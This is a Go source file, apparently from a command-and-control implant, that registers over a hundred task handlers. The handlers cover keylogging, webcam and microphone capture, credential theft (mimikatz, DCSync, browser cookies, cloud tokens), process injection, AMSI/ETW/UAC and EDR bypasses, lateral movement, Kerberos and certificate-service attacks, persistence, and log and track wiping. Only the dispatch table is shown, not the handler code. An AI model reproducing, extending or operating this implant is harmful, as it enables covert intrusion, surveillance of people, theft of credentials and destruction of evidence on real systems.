//go:build linux || windows || darwin
// +build linux windows darwin

package main

// taskHandler processes an agent task and populates the result.
type taskHandler func(Task, *TaskResult)

// taskHandlers maps task type strings to their handler functions.
var taskHandlers = map[string]taskHandler{}

func init() {
	taskHandlers = map[string]taskHandler{
		"shell":                    handleShell,
		"screenshot":               handleScreenshot,
		"screen_stream_start":      handleScreenStreamStart,
		"screen_stream_stop":       handleScreenStreamStop,
		"keylogger_start":          handleKeyloggerStart,
		"keylogger_stop":           handleKeyloggerStop,
		"keylogger_dump":           handleKeyloggerDump,
		"ps":                       handlePS,
		"process_tree":             handlePS,
		"suspend":                  handleSuspend,
		"resume":                   handleResume,
		"killproc":                 handleKillProc,
		"clipboard_get":            handleClipboardGet,
		"clipboard_set":            handleClipboardSet,
		"find":                     handleFind,
		"reg_get":                  handleRegGet,
		"reg_set":                  handleRegSet,
		"reg_delete":               handleRegDelete,
		"reboot":                   handleReboot,
		"shutdown":                 handleShutdown,
		"drives":                   handleDrives,
		"beacon_now":               handleBeaconNow,
		"services":                 handleServices,
		"portscan":                 handlePortscan,
		"netstat":                  handleNetstat,
		"users":                    handleUsers,
		"av":                       handleAV,
		"download_url":             handleDownloadURL,
		"uninstall":                handleUninstall,
		"set_sleep":                handleSetSleep,
		"creds":                    handleCreds,
		"inject":                   handleInject,
		"inject_methods":           handleInjectMethods,
		"list_inject_methods":      handleInjectMethods,
		"spawn":                    handleSpawn,
		"shinject":                 handleShinject,
		"shspawn":                  handleShspawn,
		"migrate":                  handleMigrate,
		"lateral":                  handleLateral,
		"lateral_wmi":              handleLateralWMI,
		"lateral_winrm":            handleLateralWinRM,
		"lateral_psexec":           handleLateralPsexec,
		"lateral_dcom":             handleLateralDCOM,
		"lateral_scf":              handleLateralSCF,
		"lateral_list":             handleLateralList,
		"net_scan_smb":             handleNetScanSMB,
		"net_enum_hosts":           handleNetEnumHosts,
		"socks":                    handleSocks,
		"kill_av":                  handleKillAV,
		"elevate":                  handleElevate,
		"bof":                      handleBOF,
		"elevate_printnightmare":   handleElevatePrintNightmare,
		"execute_assembly":         handleExecuteAssembly,
		"kerberoast":               handleKerberoast,
		"mimikatz":                 handleMimikatz,
		"dpapi_masterkey":          handleDPAPIMasterKey,
		"dpapi_blob":               handleDPAPIBlob,
		"dpapi_browser":            handleDPAPIBrowser,
		"lsa_bypass":               handleLSABypass,
		"adcs_find":                handleADCSFind,
		"adcs_request":             handleADCSRequest,
		"shadow_creds":             handleShadowCreds,
		"ldap_users":               handleLDAPUsers,
		"ldap_groups":              handleLDAPGroups,
		"ldap_computers":           handleLDAPComputers,
		"ldap_spn":                 handleLDAPSPN,
		"ldap_acl":                 handleLDAPACL,
		"ldap_query":               handleLDAPQuery,
		"screenshot_window":        handleScreenshotWindow,
		"ls":                       handleLS,
		"delete":                   handleDelete,
		"read":                     handleRead,
		"download":                 handleDownload,
		"upload":                   handleUpload,
		"net":                      handleNet,
		"powerpick":                handlePowerPick,
		"peloader":                 handlePELoader,
		"execute_assembly_forkrun": handleExecuteAssemblyForkRun,
		"rportfwd_start":           handleRPortFwdStart,
		"rportfwd_stop":            handleRPortFwdStop,
		"dcsync":                   handleDCSync,
		"golden_ticket":            handleGoldenTicket,
		"silver_ticket":            handleSilverTicket,
		"asreproast":               handleASREPRoast,
		"pass_the_hash":            handlePassTheHash,
		"pass_the_ticket":          handlePassTheTicket,
		"persistence_add":          handlePersistenceAdd,
		"persistence_list":         handlePersistenceList,
		"persistence_remove":       handlePersistenceRemove,
		"browser_steal":            handleBrowserSteal,
		"cookie_export":            handleCookieExport,
		"vpn_creds":                handleVpnCreds,
		"wifi_creds":               handleWifiCreds,
		"privesc_check":            handlePrivescCheck,
		"remote_input":             handleRemoteInput,
		"uac_bypass":               handleUACBypass,
		"amsi_bypass":              handleAMSIByPass,
		"etw_bypass":               handleETWByPass,
		"etw_ntrace_bypass":        handleETWNtraceBypass,
		"amsi_session_bypass":      handleAMSISessionBypass,
		"blockdlls":                handleBlockDLLs,
		"unhook_ntdll":             handleUnhookNtdll,
		"protect_process":          handleProtectProcess,
		"cleanup":                  handleCleanup,
		"log_wipe":                 handleLogWipe,
		"track_wipe":               handleTrackWipe,
		"self_delete":              handleSelfDelete,
		"kill":                     handleKill,
		"self_update":              handleSelfUpdate,
		"token_list_procs":         handleTokenListProcs,
		"token_steal":              handleTokenSteal,
		"token_make":               handleTokenMake,
		"token_revert":             handleTokenRevert,
		"rev2self":                 handleTokenRevert,
		"token_whoami":             handleTokenWhoami,
		"named_pipe_impersonate":   handleNamedPipeImpersonate,
		"juicy_potato":             handleJuicyPotato,
		"fodhelper":                handleFodhelper,
		"slui":                     handleSluiUAC,
		"eventvwr":                 handleEventvwrUAC,
		"computerdefaults":         handleComputerDefaultsUAC,

		// SSH Lateral Movement
		"ssh_lateral": handleSSHLateral,
		"ssh_keygen":  handleSSHKeygen,
		"ssh_tunnel":  handleSSHTunnel,
		"scp_upload":  handleSCPUpload,

		// Cloud Token Theft
		"cloud_steal": handleCloudTokenTheft,

		// ADCS Attack Suite (ESC1-8)
		"adcs_esc1":       handleADCSESC1,
		"adcs_esc2":       handleADCSESC2,
		"adcs_esc3":       handleADCSESC3,
		"adcs_esc4":       handleADCSESC4,
		"adcs_esc5":       handleADCSESC5,
		"adcs_esc6":       handleADCSESC6,
		"adcs_esc7":       handleADCSESC7,
		"adcs_esc8":       handleADCSESC8,
		"adcs_full_audit": handleADCSFullAudit,

		// Sleep Variator
		"set_sleep_mode": handleSetSleepMode,
		"get_sleep_mode": handleGetSleepMode,

		// Profile Rotation
		"profile_rotate": handleProfileRotate,

		// Config Push
		"config_push": handleConfigPush,

		// Working Hours
		"set_working_hours": handleSetWorkingHours,

		// Per-Agent Kill Date
		"set_kill_date":   handleSetKillDate,
		"clear_kill_date": handleClearKillDate,

		// EDR Monitor
		"edr_status": handleEdrStatus,

		// Ghost Protocol
		"ghost_mode_status": handleGhostModeStatus,
		"ghost_mode_exit":   handleGhostModeExit,

		// Reflective DLL Injection
		"reflectdll_inject": handleReflectDLLInject,

		// NTLM Coerce Attacks
		"coerce_printerbug": handleCoercePrinterBug,
		"coerce_petitpotam": handleCoercePetitPotam,
		"coerce_dfs":        handleCoerceDFS,

		// NTLM Relay
		"relay_ntlm_start": handleRelayNTLMStart,
		"relay_ntlm_stop":  handleRelayNTLMStop,
		"ntlm_help":        handleNTLMHelp,

		// Certificate Store Theft
		"cert_store_list": handleCertStoreList,

		// CLR In-Process Execution
		"clr_exec_assembly": handleCLRExecAssembly,
		"clr_powershell":    handleCLRPowerShell,

		// Egress Detection
		"run_egress": handleRunEgress,

		// BloodHound / SharpHound
		"sharphound": handleSharpHound,

		// Interactive Shell
		"interactive_shell_start": handleInteractiveShellStart,
		"interactive_shell_write": handleInteractiveShellWrite,
		"interactive_shell_stop":  handleInteractiveShellStop,

		// Multi-C2 Mode
		"set_c2_mode": handleSetC2Mode,

		// Tunnel Routes (Chisel-style subnet routing)
		"tunnel_add_route":    handleTunnelAddRoute,
		"tunnel_remove_route": handleTunnelRemoveRoute,

		// P2P Mesh Auto-Discovery
		"gossip_discover": handleGossipDiscover,

		// Container Escape
		"container_detect": handleContainerDetect,
		"container_escape": handleContainerEscape,
		"container_docker": handleContainerDocker,
		"container_k8s":    handleContainerK8s,

		// Sleep Mask Kit
		"set_sleep_mask":          handleSetSleepMask,
		"set_sleep_mask_advanced": handleSetSleepMaskAdvanced,

		// Kernel-Level Evasion
		"kernel_callback": handleEvasionKernelCallback,
		"etwti":           handleEvasionETWTI,
		"enum_callbacks":  handleEvasionEnumCallbacks,
		"objcb":           handleEvasionObjCB,
		"imgload":         handleEvasionImgLoad,

		// BOF Infection (download from server, execute in memory)
		"bof_infection": handleBOFInfection,

		// Sandbox Detection
		"sandbox_detect":          handleSandboxDetect,
		"sandbox_detect_advanced": handleSandboxDetectAdvanced,

		// Hardware Breakpoint Evasion
		"amsi_hardware_bp": handleAMSIHardwareBP,
		"etw_hardware_bp":  handleETWHardwareBP,

		// Unified Evasion
		"run_evasion": handleRunEvasion,

		// Kerberos Advanced Attacks
		"find_delegation":   handleFindDelegation,
		"constrained_deleg": handleConstrainedDeleg,
		"rbcd":              handleRBCD,
		"bronze_bit":        handleBronzeBit,
		"adminsdholder":     handleAdminSDHolder,
		"dcsync_machine":    handleDCSyncMachine,

		// Audio / Webcam Collection (P2)
		"webcam": handleWebcam,
		"mic":    handleMic,
	}
}
